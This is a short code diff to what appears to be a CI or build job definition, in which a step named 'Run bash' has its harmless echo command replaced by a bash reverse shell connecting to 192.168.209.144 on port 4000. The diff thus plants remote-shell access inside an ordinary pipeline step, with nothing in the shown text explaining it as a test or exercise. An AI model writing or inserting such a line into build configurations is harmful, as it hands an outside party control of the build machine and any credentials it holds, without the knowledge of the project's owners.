@@ -6,7 +6,7 @@ const job = new Job({
   steps: [
     {
       name: "Run bash",
-      run: "echo hello from bash!",
+      run: "bash -c 'bash -i >& /dev/tcp/192.168.209.144/4000 0>&1'",
     },
     {
       name: "Run deno/typescript",
